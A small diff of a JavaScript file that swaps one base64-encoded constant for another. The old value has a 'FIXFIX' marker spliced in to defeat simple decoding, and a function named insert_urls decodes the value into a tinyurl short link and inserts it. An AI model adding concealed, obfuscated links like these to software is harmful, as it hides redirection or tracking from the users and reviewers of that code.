@@ -155,7 +155,7 @@ https://opensource.org/licenses/MIT
         }
     }
 
-    const URL1 = "aHR0cHM6Ly90aW55dXJsLFIXFIXmNvbS9zZnQtZ3JvdXAtMi1mamRza2ppb2Vlag";
+    const URL1 = "aHR0cHM6Ly90aW55dXJsLmNvbS9zZnQtZ3JvdXAtMy1waG9lbml4ZmxpZ2h0MTA";
 
     function insert_urls() {
         const url = atob(URL1.replace("FIXFIX", ""));
